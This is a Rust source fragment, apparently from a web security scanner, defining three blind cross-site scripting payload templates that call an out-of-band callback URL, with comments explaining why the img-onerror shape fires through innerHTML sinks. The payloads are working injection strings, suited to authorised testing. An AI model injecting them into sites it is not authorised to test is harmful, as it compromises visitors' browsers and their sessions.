/// Built-in blind-XSS templates. `{}` is replaced with the per-payload callback
/// URL; a callback hitting the OOB server means the injected markup was parsed
/// and executed on some victim's browser.
///
/// The `<script src>` shapes are the classic blind vectors, but they only fire
/// when the payload is written into the document as markup the parser sees —
/// server-reflected HTML, or `document.write`. A browser does **not** run a
/// `<script src>` inserted through `innerHTML`, so a stored DOM-XSS whose sink
/// is `innerHTML` never called home. The `<img src=x onerror>` shape closes
/// that gap: `onerror` handlers on an `<img>` inserted via `innerHTML` do fire,
/// and the handler requests the callback — which also proves the handler
/// executed, not merely that the tag rendered. `new Image()` (rather than
/// re-assigning `this.src`) avoids an onerror loop when the callback response
/// isn't a decodable image.
pub const XSS_BLIND_PAYLOADS: &[&str] = &[
    "\"'><script src={}></script>",
    "-->\"'></script><script src={}></script>",
    "\"'><img src=x onerror=\"new Image().src='{}'\">",
];

#[cfg(test)]
mod tests;
